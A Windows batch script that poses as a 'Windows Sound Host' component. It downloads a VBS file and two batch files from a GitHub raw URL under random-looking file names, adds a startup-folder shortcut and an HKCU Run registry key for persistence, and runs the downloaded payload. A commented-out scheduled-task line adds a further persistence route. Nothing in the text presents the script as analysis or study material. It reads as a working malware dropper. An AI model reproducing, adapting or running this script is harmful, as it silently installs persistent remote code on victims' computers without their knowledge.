
@echo off 
cd \
if not exist %userprofile%\documents\"Windows Sound Host" ( 
    mkdir "Windows Sound Host"
)
set path1= %userprofile%\documents\"Windows Sound Host"
set RKP="HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set RKVM="SoundHostStr"
cd %path1%



:: Gets files from github /make server for downloads ltr
powershell Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/i.vbs' -Outfile ./15a65da65s1d8w86s51d8aw.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/snds.bat' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Autorun.bat' -Outfile ./31513wd5w1d3a5wd185s3d51a.bat
:: Looks for 31513wd5w1d3a5wd185s3d51a.lnk in the startup folder if not found adds to startup folder
if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk ( 
    powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk');$s.TargetPath='%userprofile%\documents\Windows Sound Host\31513wd5w1d3a5wd185s3d51a.bat';$s.Save()"
    
)

:: looks to see if the reg key already exists 
::reg query "%RKP%" /v "%RKVM%" >nul 2>nul && () || () can also be used 
reg query "%RKP%" /v "%RKVM%" >nul 2>nul
if %ERRORLEVEL% EQU 0 (
    cd %path1%
    start 31513wd5w1d3a5wd185s3d51a.bat
    exit 
) else (
    reg add "%RKP%" /v "%RKVM%" /t REG_SZ /d "\"%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk\"" /f
    cd %path1% 
    start 31513wd5w1d3a5wd185s3d51a.bat
    exit 
)


:: Needs admin, fix ltr
::schtasks /create /tn "SoundHostStr" /tr "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk" /sc minute /mo 256




